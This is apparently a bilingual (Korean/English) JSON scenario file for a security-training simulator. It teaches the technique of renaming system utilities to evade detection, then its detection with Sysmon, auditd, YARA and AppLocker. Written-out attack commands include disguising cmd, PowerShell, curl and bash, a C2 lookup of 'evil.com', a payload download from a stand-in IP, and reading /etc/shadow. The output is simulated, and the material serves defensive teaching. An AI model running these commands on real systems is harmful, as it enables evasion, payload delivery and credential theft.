@@ -1,0 +1,166 @@
+{
+  "id": "T1036.003",
+  "title": "Rename System Utilities 시뮬레이션",
+  "titleEn": "Rename System Utilities Simulation",
+  "duration": 7,
+  "phases": [
+    { "label": "📋 유틸리티 복사 & 이름 변경", "labelEn": "📋 Copy & Rename", "steps": [0] },
+    { "label": "⚡ 위장 실행", "labelEn": "⚡ Disguised Execution", "steps": [1] },
+    { "label": "🐧 Linux 위장", "labelEn": "🐧 Linux Disguise", "steps": [2] },
+    { "label": "🔍 탐지 & 분석", "labelEn": "🔍 Detection & Analysis", "steps": [3, 4] }
+  ],
+  "topoNodes": [
+    { "id": "attacker", "label": "Attacker\n(User)", "x": 50, "y": 80 },
+    { "id": "system32", "label": "System32\n(cmd/ps)", "x": 200, "y": 30 },
+    { "id": "renamed", "label": "Renamed\nBinary", "x": 200, "y": 130 },
+    { "id": "edr", "label": "EDR\nBypass", "x": 350, "y": 80 },
+    { "id": "c2", "label": "C2\nServer", "x": 480, "y": 80 }
+  ],
+  "topoEdges": [
+    { "from": "attacker", "to": "system32", "minStep": 0 },
+    { "from": "system32", "to": "renamed", "minStep": 0 },
+    { "from": "renamed", "to": "edr", "minStep": 1 },
+    { "from": "edr", "to": "c2", "minStep": 2 }
+  ],
+  "desktopIcons": [
+    { "name": "PowerShell (Admin)", "icon": "⚡" },
+    { "name": "cmd.exe", "icon": "💻" },
+    { "name": "Process Monitor", "icon": "🔍" },
+    { "name": "PE Viewer", "icon": "📋" },
+    { "name": "Sysmon", "icon": "🛡️" }
+  ],
+  "steps": [
+    {
+      "cmd": "copy C:\\Windows\\System32\\cmd.exe C:\\Users\\Public\\notepad.exe\ncopy C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\temp\\svchost.exe\ndir C:\\Users\\Public\\notepad.exe C:\\temp\\svchost.exe",
+      "out": "        1 file(s) copied.\n        1 file(s) copied.\n\n Directory of C:\\Users\\Public\n03/01/2026  09:15 AM           289,792 notepad.exe\n\n Directory of C:\\temp\n03/01/2026  09:15 AM           446,976 svchost.exe\n\n[분석]\n- cmd.exe (289,792 bytes) → notepad.exe로 복사\n- powershell.exe (446,976 bytes) → svchost.exe로 복사\n- 원본 파일은 System32에 그대로 유지\n- SHA256(notepad.exe) == SHA256(cmd.exe) → 동일 바이너리",
+      "def": "[Sysmon Event ID 11] File created: C:\\Users\\Public\\notepad.exe (suspicious location for notepad)",
+      "defAction": "Tool: copy (file duplication)\nSource: cmd.exe, powershell.exe\nDestination: C:\\Users\\Public\\notepad.exe, C:\\temp\\svchost.exe\nSysmon Event: 11 (FileCreate)\nHash Match: cmd.exe hash == notepad.exe hash\nRisk Level: High\nAction: Quarantine renamed binaries, investigate user activity",
+      "desc": "cmd.exe를 notepad.exe로, powershell.exe를 svchost.exe로 이름을 변경하여 복사합니다. 파일 해시는 원본과 동일하므로 해시 기반 탐지가 가능합니다.",
+      "descEn": "Copy cmd.exe as notepad.exe and powershell.exe as svchost.exe. File hashes remain identical to originals, enabling hash-based detection.",
+      "stepTitle": "시스템 유틸리티를 무해한 이름으로 복사",
+      "stepTitleEn": "Copy System Utilities with Benign Names",
+      "feynman": "범인(cmd.exe)이 경찰의 수배 명단에 올라 있어서, 다른 사람의 이름표(notepad.exe)를 달고 돌아다니는 것입니다. 얼굴(해시)은 같지만 이름표만 바뀌었기 때문에, 이름만 확인하는 문지기(EDR)는 통과시킵니다.",
+      "feynmanEn": "A wanted criminal (cmd.exe) wears someone else's name tag (notepad.exe) to walk around freely. The face (hash) is the same but the name tag changed, so guards (EDR) checking only names let them pass.",
+      "expert": "Windows에서 copy 명령으로 시스템 바이너리를 다른 경로에 복사하면 NTFS 메타데이터(CreationTime, Zone.Identifier)가 새로 생성됩니다. 그러나 PE(Portable Executable) 헤더의 VersionInfo.OriginalFileName 필드는 원본 값(cmd.exe)을 유지합니다. Sysmon Event ID 11(FileCreate)로 System32 외부에서 시스템 바이너리가 생성되는 것을 탐지할 수 있습니다.",
+      "expertEn": "When copying system binaries with the copy command, NTFS metadata is recreated. However, the PE header VersionInfo.OriginalFileName retains the original value (cmd.exe). Sysmon Event ID 11 (FileCreate) can detect system binary creation outside System32.",
+      "defTooltip": "🔐 cmd.exe가 notepad.exe로 위장 복사됨!",
+      "defTooltipEn": "🔐 cmd.exe copied and disguised as notepad.exe!",
+      "hackerLog": { "title": "rename_copy.log", "lines": ["[09:15:00] cmd.exe → notepad.exe 복사", "[09:15:01] powershell.exe → svchost.exe 복사", "[09:15:02] 경로: C:\\Users\\Public, C:\\temp", "[09:15:03] Sysmon Event ID 11 기록"] },
+      "terms": [
+        { "term": "PE Header", "def": "Portable Executable 헤더, Windows 실행 파일의 메타데이터를 포함하는 구조체" },
+        { "term": "OriginalFileName", "def": "PE 헤더의 VersionInfo에 포함된 원래 파일 이름 필드" }
+      ]
+    },
+    {
+      "cmd": "C:\\Users\\Public\\notepad.exe /c whoami & hostname & ipconfig /all\nC:\\temp\\svchost.exe -ep bypass -c \"[System.Net.Dns]::GetHostAddresses('evil.com') | ForEach { $_.IPAddressToString }\"",
+      "out": "CORP\\jsmith\nWORKSTATION-07\n\nWindows IP Configuration\n   Host Name . . . : WORKSTATION-07\n   IPv4 Address. . : 10.0.15.42\n   Default Gateway : 10.0.15.1\n   DNS Servers . . : 10.0.10.5\n\n[PowerShell via svchost.exe]\n198.51.100.77\n\n[프로세스 모니터]\n- PID 4521 | notepad.exe | cmd.exe 명령 실행 중!\n- PID 7892 | svchost.exe | PowerShell 엔진 로드됨!\n- 두 프로세스 모두 비정상적인 자식 프로세스 생성",
+      "def": "[EDR] Process notepad.exe (PID 4521) executing command-line operations — behavioral anomaly detected",
+      "defAction": "Tool: Renamed cmd.exe + powershell.exe\nProcess: notepad.exe (PID 4521) → cmd.exe behavior\nProcess: svchost.exe (PID 7892) → PowerShell behavior\nSysmon Event: 1 (ProcessCreate) with OriginalFileName mismatch\nBehavior: Command execution from notepad, DNS resolution from svchost\nRisk Level: Critical\nAction: Kill processes, block parent chain, forensic analysis",
+      "desc": "위장된 notepad.exe로 시스템 정보를 수집하고, svchost.exe로 위장된 PowerShell이 C2 서버 DNS를 조회합니다. EDR은 notepad가 명령줄을 실행하는 비정상 행위를 탐지합니다.",
+      "descEn": "Disguised notepad.exe collects system info, and svchost.exe-disguised PowerShell queries C2 DNS. EDR detects notepad performing command-line operations as behavioral anomaly.",
+      "stepTitle": "위장된 유틸리티로 정찰 및 C2 DNS 확인",
+      "stepTitleEn": "Reconnaissance and C2 DNS Lookup via Disguised Utilities",
+      "feynman": "가짜 이름표를 단 범인이 이제 활동을 시작합니다. '메모장'(notepad.exe)이 갑자기 시스템 정보를 수집하고, '서비스호스트'(svchost.exe)가 수상한 도메인을 조회합니다. 메모장이 명령어를 실행하는 건 마치 요리사가 갑자기 수술을 하는 것처럼 비정상적입니다.",
+      "feynmanEn": "The criminal with a fake name tag starts operating. 'Notepad' suddenly collects system info and 'svchost' queries suspicious domains. Notepad running commands is as abnormal as a chef suddenly performing surgery.",
+      "expert": "Sysmon Event ID 1(ProcessCreate)은 Image(실행 파일 경로)와 OriginalFileName(PE 헤더 값)을 모두 기록합니다. Image=notepad.exe인데 OriginalFileName=cmd.exe면 이름 변경이 확실합니다. 또한 notepad.exe가 conhost.exe를 자식 프로세스로 생성하거나 네트워크 연결을 시도하면(Event ID 3) 행위 기반 이상 탐지가 트리거됩니다. AppLocker의 Publisher Rule은 서명자 기반으로 허용/차단하므로 이름 변경만으로는 우회 불가능합니다.",
+      "expertEn": "Sysmon Event ID 1 logs both Image (file path) and OriginalFileName (PE header). Image=notepad.exe with OriginalFileName=cmd.exe confirms renaming. Notepad spawning conhost.exe or making network connections (Event ID 3) triggers behavioral anomaly detection. AppLocker Publisher Rules use signer-based policies, so renaming alone cannot bypass them.",
+      "defTooltip": "🔐 notepad.exe가 cmd 명령어 실행! 행위 기반 탐지!",
+      "defTooltipEn": "🔐 notepad.exe running cmd commands! Behavioral detection triggered!",
+      "hackerLog": { "title": "disguised_exec.log", "lines": ["[09:20:00] notepad.exe /c whoami 실행", "[09:20:02] 시스템 정보 수집 완료", "[09:20:05] svchost.exe → C2 DNS 조회", "[09:20:07] EDR 행위 이상 탐지 트리거"] },
+      "terms": [
+        { "term": "Sysmon Event ID 1", "def": "프로세스 생성 이벤트, Image와 OriginalFileName 필드를 모두 기록" },
+        { "term": "Behavioral Anomaly", "def": "프로세스의 예상 행위와 실제 행위가 다를 때 발생하는 탐지 신호" }
+      ]
+    },
+    {
+      "cmd": "# Linux 시스템 유틸리티 이름 변경\ncp /usr/bin/curl /tmp/systemd-helper\ncp /usr/bin/wget /tmp/cron-update\ncp /bin/bash /tmp/[kworker/0:1]\n/tmp/systemd-helper -s http://198.51.100.77/beacon.sh -o /tmp/.cache\n/tmp/'[kworker/0:1]' -c 'cat /etc/shadow | head -5'",
+      "out": "[*] systemd-helper → curl (C2 다운로드)\n  % Total    % Received % Xferd\n  100  4096  100  4096    0     0  12345      0 --:--:-- --:--:--\n\n[*] [kworker/0:1] → bash (커널 스레드 위장)\nroot:$6$rounds=656000$salt$hash:19325:0:99999:7:::\ndaemon:*:19157:0:99999:7:::\nbin:*:19157:0:99999:7:::\n\n[분석]\n- systemd-helper: curl의 이름 변경본, C2 페이로드 다운로드\n- cron-update: wget의 이름 변경본 (미사용 대기)\n- [kworker/0:1]: bash를 커널 스레드 이름으로 위장\n  → ps aux 출력에서 정상 커널 프로세스처럼 보임",
+      "def": "[auditd] Process /tmp/systemd-helper executed with curl syscalls — renamed binary detected",
+      "defAction": "Tool: cp + rename\nBinaries: curl → systemd-helper, wget → cron-update, bash → [kworker/0:1]\nLocation: /tmp/ (world-writable)\nauditd: execve syscall with /tmp/ path\nFile Hash: matches /usr/bin/curl, /usr/bin/wget, /bin/bash\nRisk Level: Critical\nAction: Kill processes, remove /tmp/ binaries, check C2 artifacts",
+      "desc": "Linux에서 curl을 systemd-helper로, bash를 [kworker/0:1]로 위장합니다. 특히 [kworker]는 커널 스레드 이름이므로 ps 출력에서 정상 프로세스처럼 보입니다.",
+      "descEn": "On Linux, curl is disguised as systemd-helper and bash as [kworker/0:1]. The kworker name mimics kernel threads, appearing normal in ps output.",
+      "stepTitle": "Linux에서 커널 스레드 이름으로 위장",
+      "stepTitleEn": "Disguise as Kernel Thread Names on Linux",
+      "feynman": "리눅스에서는 범인이 '경비원 유니폼(systemd-helper)'을 입거나, 아예 '벽에 붙은 장식(kworker)'처럼 위장합니다. [kworker/0:1]은 커널이 자동으로 만드는 프로세스와 이름이 같아서, 관리자가 ps 명령으로 확인해도 정상으로 보입니다.",
+      "feynmanEn": "On Linux, the criminal wears a 'guard uniform (systemd-helper)' or disguises as 'wallpaper (kworker).' [kworker/0:1] matches kernel-created process names, so admins checking ps see it as normal.",
+      "expert": "Linux에서 [kworker/0:1] 형식의 프로세스 이름은 커널 작업 스레드를 나타냅니다. 정상 kworker는 커널 공간에서 실행되어 /proc/PID/exe가 없지만, 위장 프로세스는 /proc/PID/exe → /bin/bash 심볼릭 링크가 존재합니다. auditd로 /tmp/ 경로에서 execve 시스콜을 모니터링하고, rpm -qf 또는 dpkg -S로 바이너리의 패키지 소속을 확인하여 변조를 탐지할 수 있습니다.",
+      "expertEn": "Linux [kworker/0:1] process names represent kernel work threads. Legitimate kworker runs in kernel space with no /proc/PID/exe, but disguised processes have /proc/PID/exe → /bin/bash symlinks. Monitor execve from /tmp/ via auditd and verify binary package ownership with rpm -qf or dpkg -S.",
+      "defTooltip": "🔐 bash가 [kworker/0:1]로 위장! 커널 스레드 사칭!",
+      "defTooltipEn": "🔐 bash disguised as [kworker/0:1]! Kernel thread impersonation!",
+      "hackerLog": { "title": "linux_rename.log", "lines": ["[09:25:00] curl → /tmp/systemd-helper 복사", "[09:25:01] bash → /tmp/[kworker/0:1] 복사", "[09:25:03] C2 페이로드 다운로드 시도", "[09:25:05] /etc/shadow 읽기 시도"] },
+      "terms": [
+        { "term": "kworker", "def": "Linux 커널 작업 스레드, 정상적으로는 커널 공간에서만 실행됨" },
+        { "term": "auditd", "def": "Linux 감사 데몬, 시스콜 레벨에서 시스템 활동을 모니터링" }
+      ]
+    },
+    {
+      "cmd": "# Sysmon 이벤트 분석 — OriginalFileName 불일치 탐지\nGet-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -FilterXPath \"*[System[EventID=1]]\" |\nWhere-Object { $_.Properties[27].Value -ne [IO.Path]::GetFileName($_.Properties[4].Value) } |\nSelect-Object TimeCreated, @{N='Image';E={$_.Properties[4].Value}}, @{N='OriginalFileName';E={$_.Properties[27].Value}}",
+      "out": "TimeCreated          Image                              OriginalFileName\n-----------          -----                              ----------------\n2026-03-01 09:15:12  C:\\Users\\Public\\notepad.exe         cmd.exe\n2026-03-01 09:15:14  C:\\temp\\svchost.exe                 PowerShell.exe\n2026-03-01 09:18:30  C:\\ProgramData\\update.exe           certutil.exe\n\n[분석 결과]\n- 3건의 이름 변경 바이너리 탐지\n- notepad.exe: 원본 = cmd.exe (명령 프롬프트)\n- svchost.exe: 원본 = PowerShell.exe (스크립트 엔진)\n- update.exe: 원본 = certutil.exe (인증서 유틸리티, LOLBin)\n\n[YARA 매칭]\n- rule renamed_cmd { condition: pe.original_filename == \"cmd.exe\" }\n- 3/3 바이너리 매칭 성공",
+      "def": "[SIEM] Sysmon correlation: 3 processes with OriginalFileName mismatch detected — renamed utility attack confirmed",
+      "defAction": "Tool: Sysmon Event ID 1 Analysis\nMismatches Found: 3\n1. notepad.exe → cmd.exe\n2. svchost.exe → PowerShell.exe\n3. update.exe → certutil.exe\nYARA Rules: 3/3 matched\nCorrelation: File creation (EID 11) + Process create (EID 1)\nRisk Level: Critical\nAction: Quarantine all 3 binaries, block hashes, investigate timeline",
+      "desc": "Sysmon Event ID 1의 Image와 OriginalFileName 필드를 비교하여 이름이 변경된 바이너리 3건을 탐지합니다. YARA 규칙으로 원본 파일명을 기반으로 시그니처 매칭도 수행합니다.",
+      "descEn": "Sysmon Event ID 1 comparison of Image and OriginalFileName fields detects 3 renamed binaries. YARA rules perform signature matching based on original filenames.",
+      "stepTitle": "Sysmon OriginalFileName 불일치 탐지 및 YARA 분석",
+      "stepTitleEn": "Sysmon OriginalFileName Mismatch Detection and YARA Analysis",
+      "feynman": "범인이 가짜 이름표를 달고 있지만, CCTV(Sysmon)는 얼굴(OriginalFileName)도 함께 기록합니다. '메모장'이라는 이름표를 달고 있지만 얼굴을 확인하면 'cmd.exe'인 것을 알 수 있습니다. 수배 전단지(YARA 규칙)와 대조하면 확실히 잡을 수 있습니다.",
+      "feynmanEn": "The criminal wears a fake name tag, but CCTV (Sysmon) also records the face (OriginalFileName). The name tag says 'Notepad' but checking the face reveals 'cmd.exe.' Cross-referencing with wanted posters (YARA rules) confirms the catch.",
+      "expert": "Sysmon v13+ Event ID 1의 OriginalFileName 필드(Field 27)는 PE VersionInfo에서 추출됩니다. 이 필드는 컴파일 시 설정되므로 단순 이름 변경으로는 변경 불가합니다. 공격자가 PE 헤더를 직접 수정(Resource Hacker 등)하면 우회 가능하나, 이 경우 Authenticode 서명이 깨지므로 코드 서명 검증으로 탐지할 수 있습니다. SIGMA 규칙: title: Renamed Binary / detection: selection: OriginalFileName|endswith: '.exe' filter: Image|endswith: OriginalFileName condition: selection and not filter",
+      "expertEn": "Sysmon v13+ Event ID 1 OriginalFileName (Field 27) is extracted from PE VersionInfo, set at compile time. Simple renaming cannot change it. Attackers modifying PE headers directly (Resource Hacker) can bypass this, but Authenticode signatures break, enabling code signing verification. Use SIGMA rules for automated detection.",
+      "defTooltip": "🔐 OriginalFileName 불일치 3건 탐지! YARA 규칙 매칭!",
+      "defTooltipEn": "🔐 3 OriginalFileName mismatches detected! YARA rules matched!",
+      "hackerLog": { "title": "detection_analysis.log", "lines": ["[09:30:00] Sysmon EID 1 분석 시작", "[09:30:02] notepad.exe ≠ cmd.exe 탐지", "[09:30:03] svchost.exe ≠ PowerShell.exe 탐지", "[09:30:04] update.exe ≠ certutil.exe 탐지", "[09:30:06] YARA 3/3 매칭 성공"] },
+      "terms": [
+        { "term": "YARA", "def": "악성코드 패턴 매칭 도구, 바이너리 시그니처 기반 탐지 규칙 작성" },
+        { "term": "SIGMA", "def": "SIEM 플랫폼에 독립적인 로그 탐지 규칙 작성 언어" }
+      ]
+    },
+    {
+      "cmd": "# AppLocker Publisher Rule로 이름 변경 공격 방어\n# + 해시 기반 차단 + Sysmon 경로 모니터링\nGet-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections\n\n# YARA 자동 스캔 배포\nyara -r renamed_utilities.yar C:\\ --print-strings 2>nul | findstr /i \"cmd.exe powershell.exe certutil.exe\"",
+      "out": "[AppLocker Policy — Effective]\nExe Rules:\n  Publisher: O=MICROSOFT, * → Allow (trusted publisher)\n  Path: %SYSTEMROOT%\\System32\\* → Allow\n  Path: C:\\Users\\* → Audit (사용자 경로 실행 감사)\n  Path: C:\\temp\\* → Deny (임시 경로 차단)\n  Hash: [blocked_hashes.txt] → Deny\n\n[YARA Scan Results]\nrenamed_cmd C:\\Users\\Public\\notepad.exe\n  0x0:$original_name: \"cmd.exe\"\nrenamed_powershell C:\\temp\\svchost.exe\n  0x0:$original_name: \"PowerShell.exe\"\nrenamed_certutil C:\\ProgramData\\update.exe\n  0x0:$original_name: \"certutil.exe\"\n\n[방어 효과]\n- AppLocker Publisher Rule: 서명 기반 → 이름 변경 무효화\n- Path Rule: C:\\temp\\ 차단 → svchost.exe 실행 거부\n- YARA 정기 스캔: 위장 바이너리 자동 탐지\n- Sysmon: OriginalFileName 모니터링 → 실시간 알림",
+      "def": "[SIEM] Defense hardening complete — AppLocker Publisher Rules + YARA automated scanning deployed",
+      "defAction": "Tool: AppLocker + YARA\nAppLocker Publisher Rule: Signature-based allow (name-independent)\nPath Deny: C:\\temp\\*, C:\\Users\\Public\\*\nYARA Deployment: renamed_utilities.yar → scheduled scan\nSysmon: OriginalFileName mismatch alerting\nSIGMA Rule: Deployed for SIEM correlation\nRisk Level: Mitigated\nAction: Continuous monitoring, periodic YARA scans, user awareness training",
+      "desc": "AppLocker Publisher Rule(서명 기반)은 이름 변경과 무관하게 원본 게시자를 검증합니다. Path Rule로 비인가 경로를 차단하고, YARA 정기 스캔으로 위장 바이너리를 자동 탐지합니다.",
+      "descEn": "AppLocker Publisher Rules verify original publisher regardless of name changes. Path Rules block unauthorized execution locations. Scheduled YARA scans automatically detect disguised binaries.",
+      "stepTitle": "AppLocker + YARA 규칙으로 이름 변경 공격 방어",
+      "stepTitleEn": "Defend Against Rename Attacks with AppLocker + YARA Rules",
+      "feynman": "이제 문지기(보안)가 이름표가 아니라 얼굴(서명)과 주민등록증(해시)으로 신분을 확인합니다. 또한 수상한 구역(C:\\temp)에서는 아무도 활동할 수 없도록 구역 통제(Path Rule)를 합니다. 정기적으로 CCTV 녹화본(YARA 스캔)을 검토하여 위장한 사람을 찾습니다.",
+      "feynmanEn": "Now the guard checks face (signature) and ID card (hash) instead of name tags. Suspicious areas (C:\\temp) are zone-controlled (Path Rule). Regular CCTV review (YARA scan) catches disguised individuals.",
+      "expert": "AppLocker Publisher Rule은 Authenticode 서명의 게시자, 제품명, 버전을 기반으로 실행을 제어합니다. cmd.exe → notepad.exe로 이름을 변경해도 서명이 Microsoft Corporation으로 유지되므로, Publisher Rule이 'Microsoft, cmd.exe'에 대해 특정 경로만 허용하도록 설정하면 이름 변경 우회가 불가능합니다. 추가적으로 WDAC(Windows Defender Application Control)의 Code Integrity 정책은 커널 레벨에서 바이너리를 검증하여 더 강력한 방어를 제공합니다.",
+      "expertEn": "AppLocker Publisher Rules control execution based on Authenticode signature publisher, product, and version. Renaming cmd.exe keeps the Microsoft Corporation signature, so Publisher Rules restricting 'Microsoft, cmd.exe' to specific paths prevent bypass. WDAC Code Integrity policies provide kernel-level binary verification for stronger defense.",
+      "defTooltip": "🔐 서명 기반 방어! 이름 변경해도 원본 검증 가능!",
+      "defTooltipEn": "🔐 Signature-based defense! Original verification regardless of renaming!",
+      "hackerLog": { "title": "defense_deploy.log", "lines": ["[09:35:00] AppLocker Publisher Rule 적용", "[09:35:02] Path Rule: C:\\temp 차단", "[09:35:04] YARA 스캔 3건 탐지", "[09:35:06] Sysmon OriginalFileName 모니터링 활성화"] },
+      "terms": [
+        { "term": "AppLocker Publisher Rule", "def": "Authenticode 서명 기반으로 실행 파일을 허용/차단하는 정책" },
+        { "term": "WDAC", "def": "Windows Defender Application Control, 커널 레벨에서 바이너리 무결성을 검증하는 보안 기능" }
+      ]
+    }
+  ],
+  "processTree": {
+    "name": "explorer.exe",
+    "pid": 1204,
+    "children": [
+      {
+        "name": "notepad.exe (cmd.exe)",
+        "pid": 4521,
+        "children": [
+          { "name": "conhost.exe", "pid": 4530, "children": [] },
+          { "name": "whoami.exe", "pid": 4535, "children": [] },
+          { "name": "hostname.exe", "pid": 4540, "children": [] }
+        ]
+      },
+      {
+        "name": "svchost.exe (powershell.exe)",
+        "pid": 7892,
+        "children": [
+          { "name": "conhost.exe", "pid": 7900, "children": [] }
+        ]
+      },
+      {
+        "name": "update.exe (certutil.exe)",
+        "pid": 8810,
+        "children": []
+      }
+    ]
+  }
+}
